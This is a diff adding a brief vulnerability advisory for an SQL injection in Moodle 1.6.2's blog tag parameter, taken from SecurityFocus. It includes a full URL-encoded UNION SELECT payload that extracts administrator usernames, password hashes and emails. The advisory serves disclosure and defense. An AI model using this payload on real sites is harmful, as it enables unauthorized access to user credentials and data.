@@ -1,0 +1,11 @@
+source: http://www.securityfocus.com/bid/20395/info
+
+Moodle is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data.
+
+Exploiting this issue may allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database implementation.
+
+Moodle 1.6.2 is reported vulnerable; prior versions may also be affected.
+
+http://www.example.com/blog/index.php?tag=x%2527%20UNION%20SELECT%20%2527-1%20UNION%20SELECT%201,1,1,1,1,1,1,username,password,1,1,1,1,1,1,1,username,password,email%20
+FROM%20mdl_user%20RIGHT%20JOIN%20mdl_user_admins%20ON%20mdl_user.id%3dmdl_user_admins.userid%20UNION%20SELECT%201,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1%20F
+ROM%20mdl_post%20p,%20mdl_blog_tag_instance%20bt,%20mdl_user%20u%20WHERE%201%3D0%2527,1,1,%25271
